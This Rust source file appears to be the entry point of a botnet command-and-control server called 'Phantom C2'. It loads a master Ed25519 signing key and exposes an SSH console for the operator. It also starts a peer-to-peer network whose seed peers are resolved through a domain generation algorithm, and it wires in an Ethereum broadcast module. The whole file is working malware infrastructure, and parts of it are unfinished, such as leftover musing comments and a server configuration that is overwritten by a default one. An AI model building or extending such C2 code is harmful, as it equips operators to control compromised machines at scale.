use log::{info, error};
use clap::{Parser};
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::{SigningKey, SecretKey};
use std::sync::Arc;
use tokio::net::TcpListener;

mod server;
mod dga;
mod p2p;
mod eth_broadcaster;
use p2p::P2PService;
use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};

#[derive(Parser, Debug)]
#[command(name = "Phantom C2 Server")]
#[command(version = "2.0")]
#[command(about = "SSH-based C2 Controller for Phantom Swarm", long_about = None)]
struct Cli {
    /// Path to Keys Directory (contains phantom_c2.key, phantom_eth.key, etc.)
    #[arg(long, default_value = "keys")]
    key: PathBuf,

    /// Bind Port for SSH
    #[arg(long, default_value_t = 12961)]
    port: u16,
}

fn load_master_key(path: &PathBuf) -> SigningKey {
    match fs::read(path) {
        Ok(bytes) => {
            if bytes.len() == 32 {
                let array: [u8; 32] = bytes.try_into().expect("32 bytes");
                let secret: SecretKey = array;
                SigningKey::from(secret)
            } else if bytes.len() == 64 {
                let array: [u8; 32] = bytes[0..32].try_into().expect("32 bytes");
                let secret: SecretKey = array;
                SigningKey::from(secret)
            } else {
                 panic!("Invalid Key File Length");
            }
        }
        Err(e) => panic!("Could not load Master Key at {:?}: {}", path, e),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    let cli = Cli::parse();
    
    // 1. Load Master Signing Key (Ed25519) from keys directory
    let c2_key_path = cli.key.join("phantom_c2.key");
    let master_key = load_master_key(&c2_key_path);
    info!("✅ Master Key Loaded from {:?}. ID: {}", c2_key_path, hex::encode(master_key.verifying_key().to_bytes()));
    
    // Store keys directory for later use (ETH key, etc.)
    let keys_dir = cli.key.clone();

    // 2. Setup SSH Server Config
    let config = russh::server::Config {
        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
        auth_rejection_time: std::time::Duration::from_secs(1),
        ..Default::default()
    };
    let config = Arc::new(config);

    // 3. Generate/Load Host Key (For the SSH connection itself)
    // We generate a fresh key on startup for simplicity (User sees warning on connect)
    // Or we could save it.
    let mut shk = russh_keys::key::KeyPair::generate_ed25519().unwrap();
    // Wrap in Arc/Mutex logic if needed or just use it.
    // Russh expects us to load keys into config? 
    // Wait, russh server logic usually sets keys in config.keys
    
    let mut config_mut = russh::server::Config::default();
    config_mut.keys.push(shk);
    let config = Arc::new(config_mut);



    // 4. Bind and Listen
    let addr = format!("0.0.0.0:{}", cli.port);
    info!("🚀 Phantom C2 SSH Service Starting on {}", addr);
    // User requested log display in this terminal
    info!("👉 Connect via: ssh admin@<IP> -p {}", cli.port);
    
    let mut listener = TcpListener::bind(&addr).await.expect("Bind failed");
    
    // 4. Initialize P2P Service
    let p2p_service = Arc::new(P2PService::new(Arc::new(master_key.clone())).await.expect("Failed to bind P2P"));
    
    // Spawn P2P Background Tasks
    let p2p_for_bg = p2p_service.clone();
    tokio::spawn(async move {
        p2p_for_bg.start().await;
    });

    // Spawn Bootstrap Task
    let p2p_for_boot = p2p_service.clone();
    tokio::spawn(async move {
        // 5. Bootstrap
        let seeds = dga::resolve_peers().await;
        for (ip, port) in seeds {
             if let Ok(addr) = format!("{}:{}", ip, port).parse() {
                 p2p_for_boot.add_peer(addr).await;
             }
        }
    });

    // Explicitly use the Factory/State
    // Pass p2p_service to Server so it can Broadcast
    let server_factory = server::PhantomServer::new(Arc::new(master_key), p2p_service, keys_dir.clone());

    loop {
        // Accept TCP
        let (stream, remote_addr) = listener.accept().await.unwrap();
        info!("[+] Incoming Connection from {}", remote_addr);
        
        let config = config.clone();
        let state = server_factory.state.clone();
        let key = server_factory.master_key.clone();
        let p2p = server_factory.p2p_service.clone();
        let keys_dir_clone = server_factory.keys_dir.clone();
        
        // Instantiate a fresh Session (Handler) for this connection
        let session_handler = server::PhantomSession {
            state,
            master_key: key,
            p2p_service: p2p,
            keys_dir: keys_dir_clone,
        };

        tokio::spawn(async move {
            if let Err(e) = russh::server::run_stream(config, stream, session_handler).await {
                error!("SSH Session Error: {:?}", e);
            }
        });
    }
}
